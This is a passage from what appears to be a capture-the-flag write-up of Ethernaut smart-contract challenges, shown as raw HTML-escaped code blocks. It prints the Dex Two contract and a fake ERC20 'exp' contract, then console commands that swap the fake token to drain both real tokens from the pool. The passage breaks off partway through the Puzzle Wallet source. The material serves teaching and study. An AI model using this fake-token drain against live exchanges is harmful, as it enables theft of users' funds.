&lt;&#x2F;span&gt;&lt;span&gt;    token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _token1;
&lt;&#x2F;span&gt;&lt;span&gt;    token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _token2;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add_liquidity&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;token_address, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token_address).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), amount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;from, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; amount, &amp;quot;Not enough to swap&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; swapAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getSwapAmount&lt;&#x2F;span&gt;&lt;span&gt;(from, to, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), amount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), swapAmount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, swapAmount);
&lt;&#x2F;span&gt;&lt;span&gt;  } 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getSwapAmount&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;from, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    return((amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;spender, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SwappableTokenTwo&lt;&#x2F;span&gt;&lt;span&gt;(token1).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SwappableTokenTwo&lt;&#x2F;span&gt;&lt;span&gt;(token2).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;token, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;account) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(account);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SwappableTokenTwo &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ERC20 &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address private&lt;&#x2F;span&gt;&lt;span&gt; _dex;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;dexInstance, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;name, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;symbol, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;initialSupply) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(name, symbol) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, initialSupply);
&lt;&#x2F;span&gt;&lt;span&gt;        _dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; dexInstance;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;owner, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;spender, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; _dex, &amp;quot;InvalidApprover&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_approve&lt;&#x2F;span&gt;&lt;span&gt;(owner, spender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Only swap function have modified a little. thats mean we could specify a evil contract address to swap the real token.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;spender, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;value) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;from, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;value) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;account) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{ }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;let token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; await contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;let token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; await contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;token2&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;let exp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;0x3327f08D1BaA8076C5f185DE898667fdF7D2D96F&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(exp, token1, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;await contract.swap(exp, token2, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;puzzle-wallet&quot;&gt;Puzzle Wallet&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;pragma experimental&lt;&#x2F;span&gt;&lt;span&gt; ABIEncoderV2;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;helpers&#x2F;UpgradeableProxy-08.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;PuzzleProxy &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;UpgradeableProxy &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; pendingAdmin;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; admin;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_admin, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_implementation, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory &lt;&#x2F;span&gt;&lt;span&gt;_initData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;UpgradeableProxy&lt;&#x2F;span&gt;&lt;span&gt;(_implementation, _initData) {
&lt;&#x2F;span&gt;&lt;span&gt;        admin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _admin;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyAdmin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; admin, &amp;quot;Caller is not the admin&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;      _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;proposeNewAdmin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_newAdmin) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        pendingAdmin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _newAdmin;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approveNewAdmin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_expectedAdmin) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external onlyAdmin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(pendingAdmin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; _expectedAdmin, &amp;quot;Expected new admin by the current admin is not the pending admin&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        admin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; pendingAdmin;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;upgradeTo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_newImplementation) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external onlyAdmin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_upgradeTo&lt;&#x2F;span&gt;&lt;span&gt;(_newImplementation);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;PuzzleWallet &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 public&lt;&#x2F;span&gt;&lt;span&gt; maxBalance;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; whitelisted;
